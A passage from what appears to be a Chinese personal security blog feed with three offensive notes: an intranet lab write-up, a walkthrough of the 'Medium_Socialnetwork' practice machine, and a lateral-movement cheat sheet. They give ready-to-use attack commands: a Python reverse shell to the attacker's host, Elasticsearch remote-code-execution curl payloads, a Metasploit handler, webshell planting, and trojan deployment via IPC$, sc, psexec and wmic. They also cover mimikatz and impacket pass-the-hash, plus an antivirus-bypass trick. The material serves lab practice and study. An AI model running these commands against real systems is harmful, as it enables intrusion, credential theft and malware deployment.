src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113955.png" alt="微信截图_20221118113955"></p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118114007.png" alt="微信截图_20221118114007"></p><p>挂起会话，然后查看ip地址<code>arp -a</code>。</p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118114022.png" alt="微信截图_20221118114022"></p><p>然后进行第二台机器的内网信息端口收集。</p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118114022.png" alt="微信截图_20221118114022"></p><p>发现第二台机器也存在80的web服务，通过代理去访问。</p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118114049.png" alt="微信截图_20221118114049"></p><p>翻看web源代码，发现注入点。（程序员神操作）</p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118114107.png" alt="微信截图_20221118114107"></p><p>然后工具跑出后台密码，进行登录。</p><p>通过搜索引擎找到后台登录目录，找到模板，插入一句话木马的代码</p><p><img src="/./../images/QQ%E6%88%AA%E5%9B%BE20221118221214.png" alt="QQ截图20221118221214"></p><p><img src="/./../images/QQ%E6%88%AA%E5%9B%BE20221118221307.png" alt="QQ截图20221118221307"></p><p>然后用蚁剑进行连接，然后msf生成木马，然后监听。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">use exploit/multi/handler<br><br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/bind_tcp<br><br><span class="hljs-built_in">set</span> rhost <span class="hljs-number">192.168</span>.<span class="hljs-number">22.129</span><br><br><span class="hljs-built_in">set</span> lport <span class="hljs-number">12345</span><br><br>exploit<br></code></pre></td></tr></table></figure><p>然后赋权，回弹上线。</p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118114154.png" alt="微信截图_20221118114154"></p><p>（我的蚁剑有病，实在连接不上了。）</p><p>扫了一下后面主机，开放了445端口，存在永恒之蓝漏洞，当时只知道直接用exp打，就没写下去。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#Medium_Socialnetwork(靶场)</title>
    <link href="/2022/08/05/Medium-Socialnetwork-%E9%9D%B6%E5%9C%BA/"/>
    <url>/2022/08/05/Medium-Socialnetwork-%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Medium-Socialnetwork（靶场）"><a href="#Medium-Socialnetwork（靶场）" class="headerlink" title="Medium_Socialnetwork（靶场）"></a>Medium_Socialnetwork（靶场）</h1><h1 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h1><p>进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=592"></p><p>主机发现阶段发现同一网段下有三个资产，第一个大概率是网关，第二个经验证是物理机的地址，猜测第三个地址为靶机地址，接下来要对靶机进行端口的扫描，以发现靶机上运行的服务</p><p>使用nmap进行端口扫描，第一步是对目标进行端口的发现</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=593"></p><p>发现靶机上开了两个端口，其中一个是22端口（SSH服务），另一个是非常见端口5000。针对SSH服务常见的攻击手法是弱口令、暴破或者利用一些历史版本漏洞进行突破，目前收集的信息尚少。可以对端口进行版本的发现，看看各个端口上跑的是什么服务。</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=595"></p><p>通过版本发现可以得到的信息是：系统为Ubuntu，22端口上跑的是SSH服务，5000端口上跑的是http服务，其中的Werkzeug是一个WSGI的工具包，也可以作为Web框架的底层库，基于Python2来实现。使用searchsploit 寻找关于 Werkzeug 的漏洞，可以找到两三个，均利用不成功。</p><p>整理一下目前得到的可用信息：其中SSH可以考虑暴破用户名密码，5000端口上跑了一个网站，可以访问寻找突破口，其中的框架是基于Python来实现的，若有代码执行，可以考虑用Python脚本来执行反弹shell。</p><h1 id="通过Web漏洞拿shell"><a href="#通过Web漏洞拿shell" class="headerlink" title="通过Web漏洞拿shell"></a>通过Web漏洞拿shell</h1><p>尝试访问目标的5000端口，发现是一个交互网站</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=596"></p><p>网站有输入框，但是信息提示 ”绝对安全“， 突破可能性不大。但还是尝试插入了一下XSS payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;justtry&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现还是原样输出到页面，证明该输入框不是突破点，通过查看源代码也找不到什么其他信息。</p><p>尝试收集更多的信息，在网站下进行目录扫描，看有没有管理后台或者敏感信息泄露，这里使用的是dirsearch工具</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=597"></p><p>发现 有一个 &#x2F;admin 路径，尝试访问，页面有代码测试功能，可尝试代码执行。考虑到框架是基于Python 实现的，可以找 Python 的 反弹shell 代码。</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=598"></p><p>在CSDN上找到一段现成的可以直接拿来用的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">import socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((&quot;192.168.43.173&quot;,4444));<br>os.dup2(s.fileno(),0);<br>os.dup2(s.fileno(),1);<br>os.dup2(s.fileno(),2);<br>p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);<br></code></pre></td></tr></table></figure><p>执行前 Kali 应该先监听自身的 4444 端口， 然后执行代码，成功回弹！！！</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=599"></p><p>在这里其实还遇到一个小问题，就是当 shell 是 &#x2F;bin&#x2F;bash 的时候，回弹的时候没有回显，于是尝试换成 sh ， 回弹就有回显了，我也不知道为什么。</p><p>拿下 shell 后 先看看自己的权限， 发现是 root， 就这？</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=600"></p><p>然后去看系统中存在什么文件，发现很不对劲，文件中存在Dockerfile文件，Dockerfile 是 docker 部署的一个模板文件。 初步断定闹了半天拿下的是一个docker 容器的 shell。</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=601"></p><p>可以尝试使用以下两个命令来查证是否docker 容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /.dockerenv<br><span class="hljs-comment"># 根目录下若存在dockerenv， 基本上可断定为docker容器</span><br><span class="hljs-built_in">cat</span> /proc/1/cgroup<br><span class="hljs-comment"># pid为1是初始化进程，若初始化进程中包含了docker映像的信息，可确认为docker容器</span><br></code></pre></td></tr></table></figure><p>确认为 docker 容器后，下一步是如何从 docker容器中 突破出来，最终拿到服务器的 权限。</p><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>确认容器地址， 为 172 开头的地址</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=602"></p><p>可以将容器地址看作内网地址，可以在内网中进行主机发现，看看是否还存在其他容器。</p><p>最简单进行主机发现的方法是一个个 IP 地址 去 ping， 但手工操作其实很麻烦，尝试用shell脚本完成操作</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=603"></p><p>可以发现 很快就有三个 IP 回包了， 接下来的都没有回包， 初步收集到 内网网段 三个地址。</p><p>已知 172.17.0.2 为容器地址，想要用Kali对另外两个地址进行信息收集，必须进行内网穿透，把Kali 到内网的路由 打通， 这里 用到 内网穿透工具 Venom。</p><p>首先在 Kali 上运行服务端程序 启动侦听</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=604"></p><p>为了让 目标靶机 能 获取到Venom客户端程序，在 Kali 目录下 开启 http 服务， 然后在目标靶机上使用 wget 来获取</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=605"></p><p><img src="https://cos.kevinc.ltd/file/download?fileId=606"></p><p>获取客户端程序后，赋予程序可执行权限。用客户端连接远程 Kali 机器</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=607"></p><p>可以看到程序成功执行， 跟服务端的连接也建立起来了。在服务器端，通过 show 命令 可以看到已经有一个节点 连接上来了，可以 goto 到 此节点</p><p>并启用一个监听1080 端口的 socks 代理，Kali 的 所有工具 可以通过 proxychains 这个工具 挂上这个代理去访问 容器内网的整个网段</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=608"></p><p>修改proxychains 配置文件，把代理类型改成 socks5， 代理端口 改成 1080</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=609"></p><p>挂载好后，以 proxychains 为前缀，就可以对内网的主机 进行端口扫描了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains nmap -sT -Pn 172.17.0.1<br><span class="hljs-comment"># -Pn  代表不进行主机发现， 直接对目标进行深层次的扫描</span><br><span class="hljs-comment"># -sT 进行TCP扫描</span><br></code></pre></td></tr></table></figure><p>扫描得出 172.17.0.1 开放的端口 跟 目标靶机 开放的端口一样， 都是22 和 5000浏览器挂代理后对172.17.0.1的5000端口进行访问</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=610"></p><p>继续对服务版本进行探测，发现 跟 目标靶机的 服务版本也完全一模一样。浏览器挂载代理后，访问172.17.0.1的5000端口，发现页面 也跟我们直接访问靶机地址的一模一样，可以确定172.17.0.1就是目标靶机，只不过该地址是靶机面向容器内网的地址。</p><p>继续对172.17.0.3 进行端口扫描， 发现开了9200 端口， 对服务进行探测后发现是Elasticsearch</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=611"></p><p>针对服务搜寻漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Elasticsearch<br></code></pre></td></tr></table></figure><p><img src="https://cos.kevinc.ltd/file/download?fileId=612"></p><p>发现有RCE可做利用，将漏洞利用代码拷贝到当前目录下，简单看一下脚本的执行例子。</p><p>可先尝试一下执行脚本，一般脚本在注释或者报错提示里都有脚本执行的格式，按照格式一步一步来</p><p>第一次利用脚本36337.py的时候会报错，原因是elasticsearch服务里面没有数据，所以不能通过elasticsearch来搜索进而执行命令。</p><p>解决方法是先插入一条数据，再进行脚本的利用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains curl -XPOST &#x27;http://172.17.0.3:9200/twitter/user/yren&#x27; -d &#x27;&#123; &quot;name&quot; : &quot;Wu&quot; &#125;&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains curl -XPOST &#x27;http://172.17.0.3:9200/_search?pretty&#x27; -d &#x27;&#123;&quot;script_fields&quot;: &#123;&quot;payload&quot;: &#123;&quot;script&quot;: &quot;java.lang.Math.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;).getText()&quot;&#125;&#125;&#125;&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://cos.kevinc.ltd/file/download?fileId=613"></p><p>成功拿到第二台容器的shell，查看权限，发现也是 root （没什么卵用）</p><p>在目录中发现一个敏感文件 passwords， 有可能是密码文件</p><p>查看文件，发现密码做了哈希， 去 somd5 尝试破解</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=614"></p><p>解密完密码后，可尝试使用账号密码去登录目标靶机的SSH</p><p>发现 John 用户 可直接登录到 目标靶机的 22 端口， 尝试用 sudo -s 提权，发现 John 并不能直接提升为 root 权限</p><h1 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h1><p>此时需要考虑使用系统内核漏洞去提权</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=615"></p><p>使用 searchsploit 搜索 LInux 3.13 相关的漏洞利用代码， 选用 37292.c 这个 exp，但这个 exp 有个问题。首先目标靶机上是没有装 gcc 的， 也就是说 所有的c语言代码只能在 Kali 机器上进行编译。在查看 EXP 的过程中， 发现有一段代码编译了一个c文件成so文件，再对这个so文件进行调用 —— 意味着就算在 Kali 上对 EXP 进行了编译，放到目标靶机上仍无法执行成功。</p><p>解决的思路是：修改EXP 代码， 将编译相关的代码段去掉， 然后直接找到编译好的so文件进行调用。</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=616"></p><p><img src="https://cos.kevinc.ltd/file/download?fileId=617"></p><p>同样是在 Kali 上启用 http 服务，然后在目标主机上获取到需要的文件</p><p>为了执行的方便，在获取到 exp 和 so 文件后，将文件移动到 &#x2F;tmp 目录去执行</p><p>先给 exp 赋予可执行权限 ，然后执行。 在执行的过程中，exp 会去调用 目录下的 so文件进行提权，执行结束后 使用 id 命令查看权限， 已经 拿到了目标 靶机的 root 权限了</p><p><img src="https://cos.kevinc.ltd/file/download?fileId=618"></p><h1 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h1><p>面对靶机，首先是进行主机发现。</p><p>针对发现的主机，要进行端口扫描和端口服务的发现。</p><p>若服务中有Web应用，尝试在 Web 应用中找突破点，在该靶机中，我们遇到了一个代码执行，并通过Python脚本成功获得了一个反弹shell，但通过对系统文件的搜寻发现被困在一个容器系统中。</p><p>使用 ICMP 对容器系统中的资产进行发现，发现了另外两个地址。</p><p>为了使用 Kali 的工具对内网 的容器系统进行渗透，利用Venom工具建立了从Kali 到容器内网的隧道，并在 Kali 上开启了 监听1080端口 的代理。通过proxychains 挂载这个代理在Kali 上访问内网。</p><p>发现其中一个资产开启了9200端口，判断为 Elasticsearch 服务，通过对其漏洞的利用拿下第二个docker容器的shell，并在该容器中发现了密码文件。</p><p>利用密码文件破译出的账号密码尝试登录目标系统的SSH并成功登录，却发现自己只是一个普通用户。</p><p>考虑到内核版本比较老，尝试通过内核漏洞进行提权。</p><p>由于EXP中调用了gcc进行C文件的编译，所以把关于编译的代码全部删掉，直接找到编译好的so文件进行直接调用。</p><p>最终成功获得目标主机的root权限！！！</p><p>耶！</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#横向移动姿势</title>
    <link href="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/"/>
    <url>/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-IPC-横向移动"><a href="#0x00-IPC-横向移动" class="headerlink" title="0x00.IPC$横向移动"></a>0x00.IPC$横向移动</h3><p>IPC$是windows自带的远程连接命令。IPC$(Internet Process Connection) 是为了让进程之间通信的一种“管道”。</p><p>使用IPC$连接的条件：</p><p>1.目标机器没有禁用IPC$连接，没有防火墙拦截IPC$。目标开启139，445端口。（能走445端口就不要走139端口）</p><p>2.目标机器管理员开启IPC$共享服务</p><p>3.获取了目标管理员的明文账号密码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>建立连接<br>    net use \\ip\ipc$ <span class="hljs-string">&quot;password&quot;</span> /user:<span class="hljs-string">&quot;administrator&quot;</span><br>    net use \\ip\c$ <span class="hljs-string">&quot;password&quot;</span> /user:<span class="hljs-string">&quot;administrator&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\IPC.png" alt="IPC"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">2.</span>查看网络连接，是否连接成功<br>    net use<br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\IPC_2.png" alt="IPC_2"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">3.</span>通过命令访问可以访问的文件夹<br>    dir \\ip\c$<br>    dir \\ip\admin$     <span class="hljs-comment">//一般都访问这两个文件夹</span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\IPC_3.png" alt="IPC_3"></p><p>ipc访问也可能爆出以下的错误：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>错误号 <span class="hljs-number">5</span>，拒绝访问（很可能你使用的用户不是管理员权限的，先提升权限）<br><span class="hljs-number">2.</span>错误号 <span class="hljs-number">51</span>，Windows 无法找到网络路径（网络有问题）<br><span class="hljs-number">3.</span>错误号 <span class="hljs-number">53</span>，找不到网络路径（ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤））<br><span class="hljs-number">4.</span>错误号 <span class="hljs-number">67</span>，找不到网络名（你的 lanmanworkstation 服务未启动；目标删除了 ipc$；）<br><span class="hljs-number">5.</span>错误号 <span class="hljs-number">1219</span>，提供的凭据与已存在的凭据集冲突（你已经和对方建立了一个ipc$，请删除后再连）<br><span class="hljs-number">6.</span>错误号 <span class="hljs-number">1326</span>，未知的用户名或错误密码<br><span class="hljs-number">7.</span>错误号 <span class="hljs-number">1385</span>，登录失败：未授予用户在此计算机上的请求登录类型<br><span class="hljs-number">8.</span>错误号 <span class="hljs-number">1792</span>，试图登录，但是网络登录服务没有启动（目标NetLogon服务未启动[连接域控会出现此情况]）<br><span class="hljs-number">9.</span>错误号 <span class="hljs-number">2242</span>，此用户的密码已经过期（目标有帐号策略，强制定期要求更改密码）<br></code></pre></td></tr></table></figure><p>当建立连接能够访问共享文件夹时，就上传木马</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>使用copy命令复制木马到可访问的盘<br>    copy c:\hack.exe \\ip\c$ /y<br>    copy c:\hack.exe \\<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.169</span>\c$ /y<br><span class="hljs-number">2.</span>查看文件是否复制过去<br>    dir \\ip\c$<br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\IPC_4.png" alt="IPC_4"></p><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\IPC_5.png" alt="IPC_5"></p><p>使用计划任务启动木马，使目标上线</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span> at 命令（win8 之后不在支持at命令） <br>    at \\ip  &lt;path&gt;<br>    at \\<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.169</span> c:\hack.exe<br><span class="hljs-number">2.</span> 使用schtasks.exe（使用win7-win10）<br>    sc \\ip create servicename binpath=<span class="hljs-string">&quot;path&quot;</span><br>    sc \\<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.169</span> create hack binpath=<span class="hljs-string">&quot;c:\hack.exe&quot;</span>  <span class="hljs-comment">//创建服务</span><br>    sc \\<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.169</span> start hack    <span class="hljs-comment">//启动服务</span><br>    sc \\<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.169</span> delete hack  <span class="hljs-comment">//删除服务</span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\IPC_6.png" alt="IPC_6"></p><h3 id="0x01-Psexec横向"><a href="#0x01-Psexec横向" class="headerlink" title="0x01 Psexec横向"></a>0x01 Psexec横向</h3><p>Psexec是微软提供的一种远程命令行的工具</p><p>使用Psexec不需要目标开启3389端口</p><p>前提条件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>开启admin$共享<br><span class="hljs-number">2.</span>并且防火墙放行<br><span class="hljs-comment">//注意事项</span><br>想连域控最好用域管理员账号密码连，不要用普通域账号密码连；连普通域内主机随便，用域管理员账号密码或者目标主机本地管理员账号密码都可以。<br></code></pre></td></tr></table></figure><p>利用方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">Psexec.exe -accepteula \\IP -u administrator -p password whoami <span class="hljs-comment">//-accepteula 表示不弹框</span><br>域中： Psexec.exe -accepteula \\IP -u domain\administrator -p password command<br>psexec.exe -accepteula \\IP -u domain\administrator -p password -s cmd.exe <span class="hljs-comment">//-s 返回system权限的shell</span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\Psexec.png" alt="Psexec"></p><p>这里使用powershell 远程上线</p><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\Psexec_2.png" alt="Psexec_2"></p><h3 id="0x02-wmic-横向"><a href="#0x02-wmic-横向" class="headerlink" title="0x02 wmic 横向"></a>0x02 wmic 横向</h3><p>从windows98起自带的工具，可以通过&#x2F;node 选项使用端口135上从远程过程调用（RPC）进行通信达到远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令</p><p>wmi相比psexec隐蔽性更强，无文件，无记录，操作多</p><p>wmic横向条件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">目标开启<span class="hljs-number">135</span>，<span class="hljs-number">445</span> <span class="hljs-comment">// 135管理口 ，445 回显口</span><br></code></pre></td></tr></table></figure><p>wmic很强大，可以做很多的事情</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>查看进程信息<br>    wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.169</span>/user:administrator /password:!@#Qwe123. process <span class="hljs-built_in">list</span><br><span class="hljs-number">2.</span>远程创建进程<br>    wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.169</span>/user:administrator /password:!@#Qwe123. process call create <span class="hljs-string">&quot;cmd.exe /c c:\hack.exe&quot;</span><br><span class="hljs-number">3.</span> 绕过一些杀软<br>    wmic /node:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> process call create <span class="hljs-string">&quot;cmd.exe /c c:\hack.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\wmic.png" alt="wmic"></p><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\wmic_2.png" alt="wmic_2"></p><h3 id="0x03-pth横向"><a href="#0x03-pth横向" class="headerlink" title="0x03 pth横向"></a>0x03 pth横向</h3><h4 id="利用mimikatz-hash传递"><a href="#利用mimikatz-hash传递" class="headerlink" title="利用mimikatz hash传递"></a>利用mimikatz hash传递</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>privilege::debug<br><span class="hljs-number">2.</span>sekurlsa::logonPasswords<br>    <span class="hljs-comment">//有当前机器的NTLM hash</span><br><span class="hljs-number">3.</span>sekurlsa::pth /user:administrator /domain:(目标机器ip或者机器名) /ntlm:（hash值）<br></code></pre></td></tr></table></figure><p>获取<strong>hash</strong></p><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\mimikatz_pth.jpg" alt="mimikatz_pth"></p><p>传递hash</p><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\mimikatz_pth2.png" alt="mimikatz_pth2"></p><p>弹出新的<strong>cmd</strong>（这里不需要账号密码直接访问目标机器的c盘）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span>net use \\<span class="hljs-number">10.10</span><span class="hljs-number">.1</span><span class="hljs-number">.129</span><br><span class="hljs-number">2.</span><span class="hljs-built_in">dir</span> \\<span class="hljs-number">10.10</span><span class="hljs-number">.1</span><span class="hljs-number">.129</span>\c$   <br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\mimikatz_pth3.png" alt="mimikatz_pth3"></p><p>这里就可以参考前面，<strong>upload</strong> 然后<strong>种马</strong></p><h4 id="使用wmiexec-py-进行PTH"><a href="#使用wmiexec-py-进行PTH" class="headerlink" title="使用wmiexec.py 进行PTH"></a>使用wmiexec.py 进行PTH</h4><p>下载地址：<a href="https://github.com/SecureAuthCorp/impacket">impacket</a></p><p>impacket工具包里面的脚本 指定可以指定hash 并且可以走socks代理，很强大</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#   python3 wmiexec.py  用户名:密码@IP</span><br><span class="hljs-comment">#   python3 wmiexec.py administrator:!@#QWE123@192.168.31.29  //账号密码横向</span><br><span class="hljs-comment">#   python3 wmiexec.py -hashes 00000000000000000000000000000000:e7114141b0337bdce1aedf5594706205 administrator@192.168.31.29 “whoami”  //hash横向</span><br></code></pre></td></tr></table></figure><p>![wmiexec.py ](D:\hexo\J47erry\source\images\wmiexec.py .png)</p><p>![wmiexec.py_2 ](D:\hexo\J47erry\source\images\wmiexec.py_2 .png)</p><h3 id="0x04-利用PTT进行横向"><a href="#0x04-利用PTT进行横向" class="headerlink" title="0x04 利用PTT进行横向"></a>0x04 <strong>利用PTT进行横向</strong></h3><h5 id="票据传递攻击，常用MS14-068、白银票据、黄金票据。"><a href="#票据传递攻击，常用MS14-068、白银票据、黄金票据。" class="headerlink" title="票据传递攻击，常用MS14-068、白银票据、黄金票据。"></a>票据传递攻击，常用MS14-068、白银票据、黄金票据。</h5><p><strong>说到这里大家可以去了解了解kerberos协议。</strong></p><p><strong>kerberos大概的流程：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据<br>    <br><span 